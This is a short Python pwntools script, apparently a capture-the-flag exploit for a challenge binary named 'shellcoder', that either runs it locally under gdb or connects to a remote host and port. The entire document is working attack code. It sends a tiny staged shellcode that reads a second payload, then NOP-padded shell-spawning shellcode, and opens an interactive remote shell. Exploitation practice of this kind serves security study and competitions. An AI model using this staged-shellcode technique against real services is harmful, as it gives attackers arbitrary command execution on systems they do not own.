from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./shellcoder")
else:
	p = remote("139.180.215.222","20002")

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0x4c7),b2 = hex(code_base + 0x47c)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.bits = 64
context.arch = "amd64"
debugf()
sc = asm(shellcraft.sh())
sc = asm("xchg rdi,rsi")
sc += asm("inc dh")
sc += asm("syscall")
p.sendafter("hello shellcoder:",sc)
raw_input()
sc = asm(shellcraft.sh()).rjust(0x100,"\x90")
p.send(sc)
p.sendline("ls")
p.interactive()
